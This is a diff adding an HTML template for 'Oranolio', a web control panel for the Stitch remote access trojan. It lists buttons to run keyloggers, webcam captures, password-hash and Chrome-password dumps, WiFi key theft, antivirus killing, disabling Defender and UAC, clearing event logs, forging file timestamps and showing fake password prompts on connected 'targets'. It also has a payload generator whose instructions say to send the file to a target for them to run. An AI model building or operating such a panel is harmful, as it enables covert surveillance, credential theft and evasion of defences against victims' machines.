@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="csrf-token" content="{{ csrf_token() }}">
+    <title>Oranolio - Real-Time Control</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style_real.css') }}">
+    <script nonce="{{ g.csp_nonce }}" src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+</head>
+<body>
+
+    <!-- Mobile Logout Button -->
+    <a href="{{ url_for('logout') }}" class="logout-btn mobile-only" style="display: none;">
+        <span style="font-size: 0.8rem;">Exit</span>
+    </a>
+
+    <div class="dashboard">
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <h2>⚡ Oranolio</h2>
+                <p class="version">Real-Time Interface v1.0</p>
+            </div>
+            
+            <ul class="nav-menu">
+                <li><a href="#" class="nav-link active" data-section="connections">
+                    <span>🔌</span> Connections
+                </a></li>
+                <li><a href="#" class="nav-link" data-section="commands">
+                    <span>⚡</span> Commands
+                </a></li>
+                <li><a href="#" class="nav-link" data-section="files">
+                    <span>📁</span> Files
+                </a></li>
+                <li><a href="#" class="nav-link" data-section="payloads">
+                    <span>🚀</span> Payloads
+                </a></li>
+                <li><a href="#" class="nav-link" data-section="logs">
+                    <span>📋</span> Debug Logs
+                </a></li>
+            </ul>
+            
+            <div class="sidebar-footer">
+                <div class="connection-status">
+                    <span class="status-dot online" id="serverStatus"></span>
+                    <span id="statusText">Server Online</span>
+                </div>
+                <a href="{{ url_for('logout') }}" class="logout-btn">Logout</a>
+            </div>
+        </nav>
+        
+        <main class="main-content">
+            <!-- Connections Section -->
+            <section id="connections-section" class="content-section active">
+                <div class="section-header">
+                    <h1>🎯 Active Connections Dashboard</h1>
+                    <p>Real-time connection status - Click any connection to execute commands</p>
+                </div>
+                
+                <div class="loading-indicator" id="statusLoadingIndicator">
+                    <div class="loading-spinner"></div>
+                    <span class="text">Loading server status...</span>
+                </div>
+                
+                <div class="server-status-card">
+                    <div class="status-item">
+                        <span class="status-label">Server Status:</span>
+                        <span class="status-value" id="serverListening">Loading...</span>
+                    </div>
+                    <div class="status-item">
+                        <span class="status-label">Listening Port:</span>
+                        <span class="status-value" id="serverPort">Loading...</span>
+                    </div>
+                    <div class="status-item">
+                        <span class="status-label">Active Connections:</span>
+                        <span class="status-value online-count" id="activeCount">0</span>
+                    </div>
+                </div>
+                
+                <div class="connections-header">
+                    <h2>Connections</h2>
+                    <button class="refresh-btn" id="refreshConnectionsBtn">
+                        🔄 Refresh
+                    </button>
+                </div>
+                
+                <!-- Search and Filter -->
+                <div class="search-container">
+                    <input type="text" id="connectionsSearch" class="search-input" placeholder="🔍 Search by IP, OS, hostname...">
+                    <select id="connectionsFilter" class="filter-select">
+                        <option value="all">All Status</option>
+                        <option value="online">Online Only</option>
+                        <option value="offline">Offline Only</option>
+                    </select>
+                </div>
+                
+                <div class="loading-indicator" id="connectionsLoadingIndicator">
+                    <div class="loading-spinner"></div>
+                    <span class="text">Loading connections...</span>
+                </div>
+                
+                <div class="connections-grid" id="connectionsGrid">
+                    <div class="loading-state">
+                        <p>⏳ Loading connections...</p>
+                    </div>
+                </div>
+                
+                <!-- Pagination Controls -->
+                <div id="connectionsPaginationControls"></div>
+            </section>
+            
+            <!-- Commands Section -->
+            <section id="commands-section" class="content-section">
+                <div class="section-header">
+                    <h1>⚡ Command Execution</h1>
+                    <p>Execute real commands on connected targets</p>
+                </div>
+                
+                <div class="selected-connection-info" id="selectedConnectionInfo">
+                    <p>ℹ️ Select a connection from the Connections tab first</p>
+                </div>
+                
+                <div class="command-interface">
+                    <div class="command-categories">
+                        <button class="cat-btn active" data-category="security">🔥 Control & Exploit</button>
+                        <button class="cat-btn" data-category="windows">🪟 Windows</button>
+                        <button class="cat-btn" data-category="files">📁 Files</button>
+                        <button class="cat-btn" data-category="network">🌐 Network</button>
+                        <button class="cat-btn" data-category="system">📊 System Info</button>
+                        <button class="cat-btn" data-category="admin">⚙️ Admin</button>
+                        <button class="cat-btn" data-category="macos">🍎 macOS/Linux</button>
+                        <button class="cat-btn" data-category="custom">⌨️ Custom</button>
+                    </div>
+                    
+                    <!-- Control & Exploit - Most Ruthless Commands First -->
+                    <div id="securityCommands" class="command-group active">
+                        <h3>🔥 Control & Exploit (19 commands)</h3>
+                        <div class="command-buttons">
+                            <button class="cmd-btn" data-command="keylogger status" title="Check keylogger status">Keylog Status</button>
+                            <button class="cmd-btn" data-command="keylogger start" title="Start keylogger">Keylog Start</button>
+                            <button class="cmd-btn" data-command="keylogger stop" title="Stop keylogger">Keylog Stop</button>
+                            <button class="cmd-btn" data-command="keylogger dump" title="Dump recorded keystrokes">Keylog Dump</button>
+                            <button class="cmd-btn" data-command="screenshot" title="Capture screenshot">Screenshot</button>
+                            <button class="cmd-btn" data-command="webcamlist" title="List connected webcams">Webcam List</button>
+                            <button class="cmd-btn" data-command="webcamsnap" data-with-params="true" title="Take webcam picture (device)">Webcam Snap</button>
+                            <button class="cmd-btn" data-command="avscan" title="Scan for antivirus software">AV Scan</button>
+                            <button class="cmd-btn" data-command="avkill" title="Terminate antivirus processes">AV Kill</button>
+                            <button class="cmd-btn" data-command="hashdump" title="Grab password hashes">Hash Dump</button>
+                            <button class="cmd-btn" data-command="wifikeys" title="Display saved WiFi passwords">WiFi Keys</button>
+                            <button class="cmd-btn" data-command="freeze status" title="Check input freeze status">Freeze Status</button>
+                            <button class="cmd-btn" data-command="freeze start" title="Freeze mouse and keyboard">Freeze Start</button>
+                            <button class="cmd-btn" data-command="freeze stop" title="Unfreeze mouse and keyboard">Freeze Stop</button>
+                            <button class="cmd-btn" data-command="popup" title="Display custom popup message">Popup</button>
+                            <button class="cmd-btn" data-command="displayoff" title="Turn off display monitors">Display Off</button>
+                            <button class="cmd-btn" data-command="displayon" title="Turn on display monitors">Display On</button>
+                            <button class="cmd-btn" data-command="lockscreen" title="Lock system screen">Lock Screen</button>
+                            <button class="cmd-btn" data-command="logintext" title="Set login screen text">Login Text</button>
+                        </div>
+                    </div>
+                    
+                    <!-- Windows-Specific Attacks -->
+                    <div id="windowsCommands" class="command-group">
+                        <h3>🪟 Windows-Specific (9 commands)</h3>
+                        <div class="command-buttons">
+                            <button class="cmd-btn" data-command="chromedump" title="Retrieve Chrome saved passwords">Chrome Dump</button>
+                            <button class="cmd-btn" data-command="clearev" title="Clear Windows event logs">Clear Events</button>
+                            <button class="cmd-btn" data-command="scanreg" title="Display Registry information">Scan Registry</button>
+                            <button class="cmd-btn" data-command="disableRDP" title="Disable Remote Desktop Protocol">Disable RDP</button>
+                            <button class="cmd-btn" data-command="enableRDP" title="Enable Remote Desktop Protocol">Enable RDP</button>
+                            <button class="cmd-btn" data-command="disableUAC" title="Disable User Account Control">Disable UAC</button>
+                            <button class="cmd-btn" data-command="enableUAC" title="Enable User Account Control">Enable UAC</button>
+                            <button class="cmd-btn" data-command="disableWindef" title="Disable Windows Defender">Disable Defender</button>
+                            <button class="cmd-btn" data-command="enableWindef" title="Enable Windows Defender">Enable Defender</button>
+                        </div>
+                    </div>
+                    
+                    <div id="filesCommands" class="command-group">
+                        <h3>📁 File Operations (12 commands)</h3>
+                        <div class="command-buttons">
+                            <button class="cmd-btn" data-command="download" data-with-params="true" title="Download file from target">Download</button>
+                            <button class="cmd-btn" data-command="upload" data-with-params="true" title="Upload file to target">Upload</button>
+                            <button class="cmd-btn" data-command="cat" data-with-params="true" title="Display file contents">View File (cat)</button>
+                            <button class="cmd-btn" data-command="more" data-with-params="true" title="Display file output">More</button>
+                            <button class="cmd-btn" data-command="touch" data-with-params="true" title="Create empty file">Create File</button>
+                            <button class="cmd-btn" data-command="fileinfo" data-with-params="true" title="Display file information">File Info</button>
+                            <button class="cmd-btn" data-command="hide" data-with-params="true" title="Hide file or directory">Hide</button>
+                            <button class="cmd-btn" data-command="unhide" data-with-params="true" title="Unhide</button>
+                            <button class="cmd-btn" data-command="editaccessed" data-with-params="true" title="Edit file accessed timestamp">Edit Accessed</button>
+                            <button class="cmd-btn" data-command="editcreated" data-with-params="true" title="Edit file created timestamp">Edit Created</button>
+                            <button class="cmd-btn" data-command="editmodified" data-with-params="true" title="Edit file modified timestamp">Edit Modified</button>
+                            <button class="cmd-btn" data-command="cd" data-with-params="true" title="Change directory">Change Dir</button>
+                        </div>
+                    </div>
+                    
+                    <div id="networkCommands" class="command-group">
+                        <h3>🌐 Network (8 commands)</h3>
+                        <div class="command-buttons">
+                            <button class="cmd-btn" data-command="ipconfig" title="Display network configuration">IP Config</button>
+                            <button class="cmd-btn" data-command="firewall status" title="Check firewall status">Firewall Status</button>
+                            <button class="cmd-btn" data-command="firewall open" data-with-params="true" title="Open firewall port (port in/out tcp/udp)">Firewall Open</button>
+                            <button class="cmd-btn" data-command="firewall close" data-with-params="true" title="Close firewall port (port in/out tcp/udp)">Firewall Close</button>
+                            <button class="cmd-btn" data-command="hostsfile show" title="Display hosts file">Show Hosts</button>
+                            <button class="cmd-btn" data-command="hostsfile update" data-with-params="true" title="Update hosts entry (hostname ip)">Update Hosts</button>
+                            <button class="cmd-btn" data-command="hostsfile remove" data-with-params="true" title="Remove hosts entry (hostname)">Remove Hosts</button>
+                            <button class="cmd-btn" data-command="ssh" title="Open SSH connection">SSH</button>
+                        </div>
+                    </div>
+                    
+                    <!-- System Information - Reconnaissance -->
+                    <div id="systemCommands" class="command-group">
+                        <h3>📊 System Information (9 commands)</h3>
+                        <div class="command-buttons">
+                            <button class="cmd-btn" data-command="sysinfo" title="Complete system information">System Info</button>
+                            <button class="cmd-btn" data-command="environment" title="Display environment variables">Environment</button>
+                            <button class="cmd-btn" data-command="ps" title="List all running processes">Processes</button>
+                            <button class="cmd-btn" data-command="lsmod" title="List installed drivers/kernel modules">List Modules</button>
+                            <button class="cmd-btn" data-command="drives" title="Display drive information">Drives</button>
+                            <button class="cmd-btn" data-command="location" title="Get public IP and geo-location">Location</button>
+                            <button class="cmd-btn" data-command="vmscan" title="Detect virtual machine">VM Scan</button>
+                            <button class="cmd-btn" data-command="pwd" title="Print working directory">Working Dir</button>
+                            <button class="cmd-btn" data-command="ls" title="List files and directories">List Files</button>
+                            <button class="cmd-btn" data-command="dir" data-with-params="true" title="Windows dir alias">Dir (Win)</button>
+                        </div>
+                    </div>
+                    
+                    <div id="macosCommands" class="command-group">
+                        <h3>🍎 macOS / Linux (2 commands)</h3>
+                        <div class="command-buttons">
+                            <button class="cmd-btn" data-command="askpassword" title="Display password prompt to user">Ask Password</button>
+                            <button class="cmd-btn" data-command="crackpassword" title="Crack sudo password via dictionary attack">Crack Password</button>
+                        </div>
+                    </div>
+                    
+                    <div id="adminCommands" class="command-group">
+                        <h3>⚙️ Administrative & Server (16 commands)</h3>
+                        <div class="command-buttons">
+                            <button class="cmd-btn" data-command="sudo" data-with-params="true" title="Execute with admin privileges">Sudo</button>
+                            <button class="cmd-btn" data-command="pyexec" data-with-params="true" title="Execute Python script on target">Python Exec</button>
+                            <button class="cmd-btn" data-command="run" data-with-params="true" title="Start file or application">Run / Start</button>
+                            <button class="cmd-btn" data-command="sessions" title="Display available sessions">Sessions</button>
+                            <button class="cmd-btn" data-command="shell" data-with-params="true" title="Open shell for specific session">Shell</button>
+                            <button class="cmd-btn" data-command="history" title="View connection history">History</button>
+                            <button class="cmd-btn" data-command="history_remove" data-with-params="true" title="Remove from history">Remove History</button>
+                            <button class="cmd-btn" data-command="addkey" data-with-params="true" title="Add AES encryption key">Add Key</button>
+                            <button class="cmd-btn" data-command="showkey" title="Display active AES key">Show Key</button>
+                            <button class="cmd-btn" data-command="stitchgen" title="Generate Stitch payloads">Stitch Gen</button>
+                            <button class="cmd-btn" data-command="clear" title="Clear screen">Clear Screen</button>
+                            <button class="cmd-btn" data-command="home" title="Display Stitch banner">Home</button>
+                            <button class="cmd-btn" data-command="connect" data-with-params="true" title="Connect to target (target port)">Connect</button>
+                            <button class="cmd-btn" data-command="listen" data-with-params="true" title="Listen for connections (port)">Listen</button>
+                            <button class="cmd-btn" data-command="ifconfig" title="Display network configuration (Linux)">ifconfig</button>
+                            <button class="cmd-btn" data-command="dir" title="List files (Windows alias)">Dir</button>
+                            <button class="cmd-btn" data-command="netstat" data-with-params="true" title="Network connections">Netstat</button>
+                            <button class="cmd-btn" data-command="portscan" data-with-params="true" title="Scan ports on host">Port Scan</button>
+                        </div>
+                    </div>
+                    
+                    <div id="customCommands" class="command-group">
+                        <h3>🛠️ Custom Command</h3>
+                        <p class="help-text" style="margin-bottom: 1rem;">Enter any Stitch command manually. Supports all 75+ commands with parameters.</p>
+                        <div class="command-input-section">
+                            <input type="text" id="customCommandInput" placeholder="e.g., download /etc/passwd, sudo systemctl status, etc...">
+                            <button class="cmd-btn" id="executeCustomBtn">Execute</button>
+                        </div>
+                    </div>
+                    
+                    <div class="command-output">
+                        <div class="output-header">
+                            <h3>Command Output</h3>
+                            <div class="output-actions">
+                                <button class="clear-btn" id="copyOutputBtn">📋 Copy</button>
+                                <button class="clear-btn" id="clearOutputBtn">Clear</button>
+                            </div>
+                        </div>
+                        <pre id="commandOutput">Ready to execute commands...</pre>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Files Section -->
+            <section id="files-section" class="content-section">
+                <div class="section-header">
+                    <h1>📁 File Management</h1>
+                    <p>Upload files to targets and view downloaded files</p>
+                </div>
+                
+                <!-- File Upload Area -->
+                <div class="upload-container">
+                    <h3>📤 Upload File to Target</h3>
+                    <p class="help-text">Select a file or drag and drop to upload to the currently selected target</p>
+                    <div class="upload-zone" id="uploadZone">
+                        <div class="upload-icon">📎</div>
+                        <div class="upload-text">
+                            <p><strong>Click to select a file</strong> or drag it here</p>
+                            <p class="text-muted">Max file size: 100MB</p>
+                        </div>
+                        <input type="file" id="fileInput" style="display: none;">
+                    </div>
+                    <div class="upload-info" id="uploadInfo" style="display: none;">
+                        <p><strong>Selected:</strong> <span id="fileName"></span></p>
+                        <p><strong>Size:</strong> <span id="fileSize"></span></p>
+                        <div class="upload-actions">
+                            <button class="cmd-btn" id="uploadSubmitBtn">Upload to Target</button>
+                            <button class="clear-btn" id="uploadCancelBtn">Cancel</button>
+                        </div>
+                    </div>
+                    <div class="upload-progress" id="uploadProgress" style="display: none;">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="progressFill"></div>
+                        </div>
+                        <p id="progressText">Uploading... 0%</p>
+                    </div>
+                </div>
+                
+                <div style="margin: 2rem 0; border-top: 1px solid var(--border);"></div>
+                
+                <!-- Downloaded Files Section -->
+                <div class="section-header" style="margin-top: 2rem;">
+                    <h3>📥 Downloaded Files</h3>
+                    <p class="help-text">Files downloaded from connected targets</p>
+                </div>
+                
+                <!-- Files Search -->
+                <div class="search-container">
+                    <input type="text" id="filesSearch" class="search-input" placeholder="🔍 Search files by name..." onkeyup="filterFiles()">
+                </div>
+                
+                <div class="loading-indicator" id="filesLoadingIndicator">
+                    <div class="loading-spinner"></div>
+                    <span class="text">Loading files...</span>
+                </div>
+                
+                <div class="files-grid" id="filesGrid">
+                    <div class="loading-state">
+                        <p>⏳ Loading files...</p>
+                    </div>
+                </div>
+                
+                <!-- Pagination Controls -->
+                <div id="filesPaginationControls"></div>
+            </section>
+            
+            <!-- Payloads Section -->
+            <section id="payloads-section" class="content-section">
+                <div class="section-header">
+                    <h1>🚀 Payload Generation</h1>
+                    <p>Generate custom Stitch payloads for target deployment</p>
+                </div>
+                
+                <div class="payload-generator">
+                    <div class="generator-form">
+                        <h3>Payload Configuration</h3>
+                        <form id="payloadForm">
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label>
+                                        <input type="checkbox" id="enableBind" checked>
+                                        Enable Bind Mode (Target connects to you)
+                                    </label>
+                                    <div class="bind-config" id="bindConfig">
+                                        <input type="text" id="bindHost" placeholder="Your IP (leave empty for any)" value="">
+                                        <input type="number" id="bindPort" placeholder="Port" value="4433" min="1" max="65535">
+                                    </div>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label>
+                                        <input type="checkbox" id="enableListen" checked>
+                                        Enable Listen Mode (You connect to target)
+                                    </label>
+                                    <div class="listen-config" id="listenConfig">
+                                        <input type="text" id="listenHost" placeholder="Target IP" value="localhost">
+                                        <input type="number" id="listenPort" placeholder="Port" value="4455" min="1" max="65535">
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-actions">
+                                <button type="button" class="cmd-btn" id="generatePayloadBtn">
+                                    🚀 Generate Payload
+                                </button>
+                                <button type="button" class="clear-btn" id="resetPayloadBtn">
+                                    Reset
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                    
+                    <div class="payload-output" id="payloadOutput" style="display: none;">
+                        <h3>Generated Payload</h3>
+                        <div class="payload-info" id="payloadInfo"></div>
+                        <div class="payload-actions">
+                            <button class="cmd-btn" id="downloadPayloadBtn">
+                                📥 Download Payload
+                            </button>
+                            <button class="clear-btn" id="copyPayloadInfoBtn">
+                                📋 Copy Info
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-instructions">
+                        <h3>📖 Usage Instructions</h3>
+                        <div class="instructions-content">
+                            <h4>Bind Mode (Recommended)</h4>
+                            <p>• Target connects back to your server</p>
+                            <p>• Leave "Your IP" empty to accept connections from any IP</p>
+                            <p>• Make sure port 4433 is open on your firewall</p>
+                            
+                            <h4>Listen Mode</h4>
+                            <p>• You connect to the target</p>
+                            <p>• Useful when target is behind NAT/firewall</p>
+                            <p>• Target must be listening on specified port</p>
+                            
+                            <h4>Deployment</h4>
+                            <p>• Send the generated Python file to target</p>
+                            <p>• Target runs: <code>python stitch_payload.py</code></p>
+                            <p>• Connection will appear in the Connections tab</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Logs Section -->
+            <section id="logs-section" class="content-section">
+                <div class="section-header">
+                    <h1>📋 Debug Logs</h1>
+                    <p>Real-time system logs</p>
+                </div>
+                
+                <!-- Export Options -->
+                <div class="export-container">
+                    <h3>📥 Export Data</h3>
+                    <div class="export-buttons">
+                        <button class="cmd-btn" data-export-type="logs" data-format="json">📋 Export Logs (JSON)</button>
+                        <button class="cmd-btn" data-export-type="logs" data-format="csv">📄 Export Logs (CSV)</button>
+                        <button class="cmd-btn" data-export-type="commands" data-format="json">⚡ Export Commands (JSON)</button>
+                        <button class="cmd-btn" data-export-type="commands" data-format="csv">⚡ Export Commands (CSV)</button>
+                    </div>
+                </div>
+                
+                <div style="margin: 1.5rem 0; border-top: 1px solid var(--border);"></div>
+                
+                <div class="loading-indicator" id="logsLoadingIndicator">
+                    <div class="loading-spinner"></div>
+                    <span class="text">Loading logs...</span>
+                </div>
+                
+                <div class="logs-container">
+                    <div class="logs-header">
+                        <button class="refresh-btn" id="refreshLogsBtn">🔄 Refresh</button>
+                        <button class="clear-btn" id="clearLogsBtn">Clear</button>
+                    </div>
+                    <div id="debugLogs" class="logs-output">
+                        <p class="log-entry">System initialized...</p>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+    
+    <div id="toast-container"></div>
+    
+    <script nonce="{{ g.csp_nonce }}" src="{{ url_for('static', filename='js/app_real.js') }}"></script>
+</body>
+</html>
